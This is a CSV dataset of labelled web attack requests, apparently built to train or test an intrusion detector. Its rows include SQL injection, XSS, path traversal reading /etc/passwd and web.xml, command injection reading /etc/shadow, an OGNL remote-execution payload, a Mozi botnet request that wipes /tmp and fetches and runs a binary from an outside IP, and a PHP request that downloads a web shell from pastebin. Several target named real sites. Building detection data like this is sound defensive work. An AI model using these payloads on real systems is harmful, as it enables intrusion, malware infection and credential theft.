payload,label,attack_syntax,attack_type
"http://-ip-:-port-/dvwa/instructions.php /dvwa/instructions.php?doc=1 -3831)))/**/OR/**/(SELECT/**/(CASE/**/WHEN/**/(1-port-9=1029)/**/THEN/**/NULL/**/ELSE/**/CAST((CHR(106)||CHR(99)||CHR(85)||CHR(71))/**/AS/**/NUMERIC)/**/END))/**/IS/**/NULL/**/AND/**/(((2158=2158 PHPSESSID=jlpd56fppfes3q8njmedlrscgq;security=impossible,",1,-3831)))/**/OR/**/(SELECT/**/(CASE/**/WHEN/**/(1-port-9=1029)/**/THEN/**/NULL/**/ELSE/**/CAST((CHR(106)||CHR(99)||CHR(85)||CHR(71))/**/AS/**/NUMERIC)/**/END))/**/IS/**/NULL/**/AND/**/(((2158=2158,SQL Injection
"GET /servlets/org/front/board/action/board?,nd=CONTENT%22%29%20AS%20jsqt%20WHERE%202944%3D2944%20RLIKE%20%28SELECT%20%28CASE%20WHEN%20%285414%3D5414%29%20THEN%200x434f4e54454e54%20ELSE%200x28%20END%29%29--%20TLOm&listcount=10&curpage=1&orderby=&direction=&board=notice&board_seq=8669&b_cate=&b_search= HTTP/1.1\r\nCache-Control: no-cache\r\nUser-Agent: Mozilla/5.0 (Macintosh; U; PPC Mac OS X; sv-se) AppleWebKit/312.5.2 (KHTML, like Gecko) Safari/312.3.3\r\nReferer: http://koreatta.sports.or.kr:80/servlets/org/front/board/action/board\r\nHost: koreatta.sports.or.kr\r\nCookie: JSESSIONID=687E670FA15545C67CAC389EA80390E0\r\nAccept: */*\r\nAccept-Encoding: gzip,deflate\r\nConnection: close",1,"GET /servlets/org/front/board/action/board?,nd=CONTENT%22%29%20AS%20jsqt%20WHERE%202944%3D2944%20RLIKE%20%28SELECT%20%28CASE%20WHEN%20%285414%3D5414%29%20THEN%200x434f4e54454e54%20ELSE%200x28%20END%29%29--%20TLOm",SQL Injection
"GET /main/board/kboard_list.asp page=&search_t=&search_m=+alert(1725)+ 200 Mozilla/5.0+(Windows+NT+6.1;+WOW64;+Trident/7.0;+rv:11.0)+like+Gecko,",1,GET /main/board/kboard_list.asp page=&search_t=&search_m=+alert(1725)+,Cross-Site Scripting (XSS)
"http://-ip-/dvwa/vulnerabilities/captcha/ /dvwa/about.php/?%3E'%22%3E%3Cscript%3Ealert(1201)%3C/script%3E Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko security=impossible; PHPSESSID=bv53361rm8kfr5272v9bu9cicj,",1,http://-ip-/dvwa/vulnerabilities/captcha/ /dvwa/about.php/?%3E'%22%3E%3Cscript%3Ealert(1201)%3C/script%3E,Cross-Site Scripting (XSS)
"POST /account HTTP/1.1Host: 210.104.16.115:8080User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36Content-Length: 99Connection: closeContent-Type: application/x-www-form-urlencodedAccept-Encoding: gzipname[#this.getClass().forName('java.lang.Runtime').getRuntime().exec('cat+%2Fetc%2Fpasswd')]=nuclei",1,"POST /account HTTP/1.1
Host: 210.104.16.115:8080
User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36
Content-Length: 99
Connection: close
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip

name[#this.getClass().forName('java.lang.Runtime').getRuntime().exec('cat+%2Fetc%2Fpasswd')]=nuclei",Remote Command Execution (RCE)
GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm -rf /tmp/*;wget http://221.160.177.182:1655/Mozi.m -O /tmp/netgear;sh netgear&curpath=/&currentsetting.htm=1 HTTP/1.0,1,GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm -rf /tmp/*;wget http://221.160.177.182:1655/Mozi.m -O /tmp/netgear;sh netgear&curpath=/&currentsetting.htm=1 HTTP/1.0,Remote Code Execution (RCE)
"GET /res/I18nMsg,AjxMsg,ZMsg,ZmMsg,AjxKeys,ZmKeys,ZdMsg,Ajx%20TemplateMsg.js.zgz?v=091214175450&skin=../../../../../../../../../etc/passwd%00 HTTP/1.1Host: art.karts.ac.krUser-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36Connection: closeAccept: */*Accept-Language: enAccept-Encoding: gzip",1,"GET /res/I18nMsg,AjxMsg,ZMsg,ZmMsg,AjxKeys,ZmKeys,ZdMsg,Ajx%20TemplateMsg.js.zgz?v=091214175450&skin=../../../../../../../../../etc/passwd%00 HTTP/1.1 Host: art.karts.ac.kr User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36 Connection: close Accept: */* Accept-Language: en Accept-Encoding: gzip",Path Traversal
"GET /artStudio/AjaxArtProgramDetail.do?oppId=&oppTargetSite=01&pageIndex=../../../WEB-INF/web.xml%3F&searchBeforeYear=&searchCcdId=&searchText=&searchType=&searchYear=&snsOppId1= HTTP/1.1\r\nReferer: http://www.mmca.go.kr/\r\nCookie: JSESSIONID=6oaryRcz9daWK6xfosxLF1r8xsSm03aTX0Ku4WVFlIU91uWFJbZGd0OoXbAUSmTo.mocaweb_servlet_engine7;CID=null\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: gzip,deflate\r\nHost: www.mmca.go.kr\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36\r\nConnection: Keep-alive",1,"GET /artStudio/AjaxArtProgramDetail.do?oppId=&oppTargetSite=01&pageIndex=../../../WEB-INF/web.xml%3F&searchBeforeYear=&searchCcdId=&searchText=&searchType=&searchYear=&snsOppId1= HTTP/1.1 Referer: http://www.mmca.go.kr/ Cookie: JSESSIONID=6oaryRcz9daWK6xfosxLF1r8xsSm03aTX0Ku4WVFlIU91uWFJbZGd0OoXbAUSmTo.mocaweb_servlet_engine7;CID=null Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Encoding: gzip,deflate Host: www.mmca.go.kr User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36 Connection: Keep-alive",Path Traversal
"GET /crowd/plugins/servlet/exp?cmd=cat%20/etc/shadow HTTP/1.1Host: newsletter.karts.ac.krUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1944.0 Safari/537.36Connection: closeAccept: */*Accept-Language: enAccept-Encoding: gzip",1,"GET /crowd/plugins/servlet/exp?cmd=cat%20/etc/shadow HTTP/1.1 Host: newsletter.karts.ac.kr User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1944.0 Safari/537.36 Connection: close Accept: */* Accept-Language: en Accept-Encoding: gzip",Command Injection
"GET /modules/bamegamenu/ajax_phpcode.php?code=system(%22wget%20-O%20../../up.php%20pastebin.com/raw/CsS17dZX%22); HTTP/1.1Host: gokams.or.krConnection: keep-aliveAccept-Encoding: gzip, deflateAccept: */*User-Agent: python-requests/2.27.1",1,"GET /modules/bamegamenu/ajax_phpcode.php?code=system(%22wget%20-O%20../../up.php%20pastebin.com/raw/CsS17dZX%22); HTTP/1.1 Host: gokams.or.kr Connection: keep-alive Accept-Encoding: gzip, deflate Accept: */* User-Agent: python-requests/2.27.1",Command Injection
